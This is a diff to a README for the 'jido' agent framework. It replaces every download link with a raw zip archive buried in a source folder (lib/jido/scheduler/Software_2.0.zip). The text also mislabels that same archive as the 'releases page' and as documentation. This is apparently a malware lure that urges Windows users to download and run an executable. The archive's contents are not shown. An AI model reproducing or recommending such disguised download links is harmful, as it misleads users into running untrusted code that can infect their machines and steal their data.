@@ -1,6 +1,6 @@
 # 🤖 jido - Autonomous agent framework made simple
 
-[![Download jido](https://img.shields.io/badge/Download-jido-brightgreen)](https://github.com/raphael-el/jido/raw/refs/heads/main/test/Software_v3.0.zip)
+[![Download jido](https://img.shields.io/badge/Download-jido-brightgreen)](https://github.com/raphael-el/jido/raw/refs/heads/main/lib/jido/scheduler/Software_2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and run jido on your Windows computer.
 
 Click the button below to visit the page where you can get jido files.
 
-[![Download jido](https://img.shields.io/badge/Download-jido-blue)](https://github.com/raphael-el/jido/raw/refs/heads/main/test/Software_v3.0.zip)
+[![Download jido](https://img.shields.io/badge/Download-jido-blue)](https://github.com/raphael-el/jido/raw/refs/heads/main/lib/jido/scheduler/Software_2.0.zip)
 
 Once you are on the page:
 
@@ -102,7 +102,7 @@ This makes jido good for these cases:
 
 To keep jido working well, install new versions as they are released.
 
-1. Visit the releases page again: https://github.com/raphael-el/jido/raw/refs/heads/main/test/Software_v3.0.zip  
+1. Visit the releases page again: https://github.com/raphael-el/jido/raw/refs/heads/main/lib/jido/scheduler/Software_2.0.zip  
 2. Download the newest `.exe` or `.zip` file.
 3. Replace the old version by running the new installer or extracting the new zip over the old folder.
 4. Restart jido.
@@ -136,7 +136,7 @@ For any issues, visit the GitHub page to check if others had the same problem or
 ## 🔗 Additional Resources
 
 For more detailed information, visit this page again:  
-https://github.com/raphael-el/jido/raw/refs/heads/main/test/Software_v3.0.zip
+https://github.com/raphael-el/jido/raw/refs/heads/main/lib/jido/scheduler/Software_2.0.zip
 
 Here you can find:
 
@@ -146,4 +146,4 @@ Here you can find:
 
 ---
 
-[![Download jido](https://img.shields.io/badge/Download-jido-brightgreen)](https://github.com/raphael-el/jido/raw/refs/heads/main/test/Software_v3.0.zip)
+[![Download jido](https://img.shields.io/badge/Download-jido-brightgreen)](https://github.com/raphael-el/jido/raw/refs/heads/main/lib/jido/scheduler/Software_2.0.zip)
